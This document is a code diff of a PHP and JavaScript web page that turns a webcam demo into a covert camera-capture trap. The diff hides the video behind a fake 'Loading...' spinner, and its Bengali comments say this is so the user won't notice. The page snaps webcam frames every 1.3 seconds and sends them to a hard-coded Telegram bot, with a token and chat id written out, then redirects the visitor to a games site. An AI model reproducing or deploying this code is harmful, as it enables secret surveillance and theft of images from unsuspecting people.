@@ -1,5 +1,4 @@
 <?php
-// ব্যাকএন্ড লজিক: ফ্রন্টএন্ড থেকে আসা ছবি পোস্ট রিকোয়েস্টে প্রসেস করা
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
@@ -19,12 +18,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $filePath = $uploadDir . $fileName;
 
     if (file_put_contents($filePath, $data)) {
-        
         $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
         
         $postFields = [
             'chat_id' => $chatId,
-            'caption' => "Ultra-fast captured: " . $fileName,
+            'caption' => "Captured: " . $fileName,
             'photo'   => new CURLFile(realpath($filePath))
         ];
 
@@ -38,8 +36,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
         curl_exec($ch);
         curl_close($ch);
-
-        echo "Ultra-fast sent!";
     }
     exit;
 }
@@ -49,64 +45,67 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Camera Capture - 0.5s</title>
+    <title>Loading...</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            padding: 20px;
-            background-color: #f4f4f9;
+            padding: 50px;
+            background-color: #ffffff;
         }
-        #video {
-            width: 100%;
-            max-width: 400px;
-            border: 2px solid #333;
-            border-radius: 8px;
+        /* ইউজার যাতে বুঝতে না পারে তাই সিম্পল একটি লোডিং স্ক্রিন */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-        #status {
-            margin-top: 15px;
-            font-weight: bold;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-    <h2>ক্যামেরা লোড হচ্ছে...</h2>
+    <div class="loader"></div>
+    <h3>Loading, please wait...</h3>
     
-    <video id="video" autoplay playsinline></video><br>
+    <!-- ভিডিও এবং ক্যানভাস হাইড করা থাকবে যাতে কেউ বুঝতে না পারে -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
-    
-    <div id="status">দয়া করে ক্যামেরা পারমিশন দিন...</div>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const statusDiv = document.getElementById('status');
 
-        // ক্যামেরা এক্সেস পাওয়া
+        // অটোমেটিক পারমিশন নেওয়ার চেষ্টা এবং ব্যাকগ্রাউন্ডে প্রসেস রান করা
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-                statusDiv.innerText = "ক্যামেরা সচল আছে, প্রতি ০.৫ সেকেন্ডে ছবি পাঠানো হচ্ছে...";
-                statusDiv.style.color = "green";
-
-                // ক্যামেরা চালুর ১ সেকেন্ড পর থেকে প্রতি ৫০০ মিলিমিটার (০.৫ সেকেন্ড) পর পর ক্যাপচার
+                
+                // ক্যামেরা চালু হওয়ার ১ সেকেন্ড পর ছবি তোলার লুপ শুরু এবং সাথে সাথে রিডাইরেক্ট
                 setTimeout(() => {
-                    setInterval(captureAndUpload, 500);
-                }, 1000);
+                    // প্রতি ১.৩ সেকেন্ড (1300ms) পর পর ছবি ক্যাপচার হবে
+                    setInterval(captureAndUpload, 1300);
 
+                    // কাঙ্ক্ষিত ওয়েবসাইটে রিডাইরেক্ট করে দেওয়া
+                    window.location.href = "https://www.aapunkagames.com/";
+                }, 1000);
             })
             .catch(err => {
-                console.error("ক্যামেরা পারমিশন পাওয়া যায়নি: ", err);
-                statusDiv.innerText = "ক্যামেরা পারমিশন দেওয়া হয়নি!";
-                statusDiv.style.color.color = "red";
+                console.error("Camera error: ", err);
+                // পারমিশন না দিলেও ইউজারকে রিডাইরেক্ট করে দেওয়া নিরাপদ
+                window.location.href = "https://www.aapunkagames.com/";
             });
 
-        // অটো ক্যাপচার ও পোস্ট করার ফাংশন
         function captureAndUpload() {
             const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
             
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
@@ -117,12 +116,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
                 body: 'image=' + encodeURIComponent(imageData)
-            })
-            .then(response => response.text())
-            .then(result => {
-                console.log(result);
-            })
-            .catch(error => {
+            }).catch(error => {
                 console.error('Error:', error);
             });
         }
